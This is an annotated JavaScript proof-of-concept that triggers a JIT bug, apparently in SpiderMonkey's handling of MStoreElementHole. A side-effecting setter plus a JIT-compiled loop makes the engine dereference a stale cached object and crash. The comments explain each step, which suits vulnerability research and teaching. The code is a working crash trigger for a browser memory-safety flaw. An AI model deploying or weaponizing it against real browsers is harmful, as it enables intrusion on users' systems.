let arr1 = []; // Create a victim array to be manipulated
let arr2 = [1.1, 2.2, , 4.4]; // Create the array that will cause the side effects
arr2.__defineSetter__("-1", function(x) { // Set the side-effect for the index -1
    delete arr1.x; // Delete the property x of the victim array
});
{
    function f(b, index) {
        let ai = {}; // Create one object
        let aT = {}; // Create a second object
        arr1.x = ai; // Assign property x in the victim array to the first object
        if (b) // Every other run...
            arr1.x = aT; // Assign property x in the victim array to the second object - This is likely done to prevent object assignments being inlined and allow property x to be cached
        arr2[index] = 1.1; // Perform side-effect execution using MStoreElementHole
        arr1.x.x4 = 0; // Dereference the object from the inline cache, which now doesn't exist, causing a crash
    }
    delete arr1.x; // Start by deleting property x in the victim array - This should change the shape of arr1 to one with a property x
    for (let i = 0; i < 0x1000; i++) { // JIT the function
        arr2.length = 4; // Reset the array length to 4 so that arr2[index] is still writing to a hole
        f((i & 1) === 1, 5); // Call the function that will be JIT'd, but alternating the first arguments between true and false
    }
    f(true, -1); // Finally, run the function with the first parameter as true, and the second as a number that will trigger the side effects. Since the type of index is expected to be an int32, -1 still works
}
